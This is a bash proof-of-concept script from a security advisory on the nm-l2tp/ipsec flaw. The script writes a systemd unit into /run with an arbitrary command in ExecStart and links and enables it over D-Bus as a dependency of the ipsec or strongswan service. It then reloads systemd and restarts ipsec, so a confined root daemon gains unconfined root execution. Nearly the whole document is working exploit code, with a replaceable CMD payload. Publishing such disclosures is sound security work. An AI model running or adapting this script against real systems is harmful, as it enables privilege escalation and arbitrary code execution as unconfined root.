#!/bin/bash
#
# LinnemanLabs - systemd activation-pull PoC - want. link enable.
#
# https://linnemanlabs.com/posts/confined-root-is-still-root/
# https://linnemanlabs.com/posts/nm-l2tp-newline-to-root/
# https://github.com/linnemanlabs/advisories/
#
# confined uid-0 daemon with zero service-start permissions can create a systemd unit
# with "WantedBy=" in it, causing a target daemon to have a weak dependency on it.
# if that service has not been loaded yet its dependencies are not cached yet.
#
# modified for nm-l2tp vulnerability - ipsec_mgmt_t has daemon-reload and restart
# permissions, making this self-contained and more reliable/simpler.
#
UNIT_PATH=${UNIT_PATH:-/run}

set -eu
RUN_ID="$( date +%s )$$"
UNIT="${UNIT_PATH}/linnemanlabs-poc-${RUN_ID}.service"
SD="org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager"
DEFAULT_CMD='{ id; grep ^Cap /proc/self/status; } > /tmp/service.out-'"${RUN_ID}"
CMD=${CMD:-$DEFAULT_CMD}

# find ipsec service name
svcips="$( systemctl status ipsec 2>/dev/null || true )"
svcstrong="$( systemctl status strongswan 2>/dev/null || true )"
if [ "${svcips}x" != "x" ];then
  ipsecsvc="ipsec"
else
  if [ "${svcstrong}" == "x" ];then
     echo "[-] did not find ipsec service name"
     exit 1
  fi
  ipsecsvc="strongswan"
fi
echo "[*] using ipsec service: ${ipsecsvc}"

# create a unit whose ExecStart is bin_t (init_t + bin_t -> unconfined_service_t), wanted by the pivot
echo "[*] writing unit to ${UNIT}"
cat > "${UNIT}" <<EOF
[Unit]
Description=LinnemanLabs PoC

[Service]
Type=oneshot
ExecStart=/usr/bin/env sh -c '${CMD}'

[Install]
WantedBy=${ipsecsvc}.service
EOF

# Link turns our /run file into a known unit - no daemon-reload needed
echo "[*] linking ${UNIT} to create known unit"
busctl call ${SD} LinkUnitFiles asbb 1 "${UNIT}" true true
echo "[+] linked ${UNIT}"

# Enable wires it into the cold pivot's .wants (pivot not loaded yet, so still no reload)
echo "[*] enabling unit to create .wants link"
busctl call ${SD} EnableUnitFiles asbb 1 "${UNIT}" true true
echo "[+] enabled - ${ipsecsvc}.service now weakly depends on us"

# daemon-reload to pick up our dependency
echo "[*] running daemon-reload to reload ipsec unit"
systemctl daemon-reload

# restart ipsec service to start our dependency
echo "[+] restarting ipsec to start our dependency"
# we need to background cleanup operations or echo a notice about it
# the restart will kill this script too
systemctl restart ${ipsecsvc}.service
sleep 5

# Unlink our service
# echo "[*] cleaning up - unlinking our service and deleting unit file"
# busctl call ${SD} DisableUnitFiles asb 1 "$( basename "${UNIT}" )" false
# rm -f "${UNIT}"
# systemctl daemon-reload
echo "[+] done"

exit 0
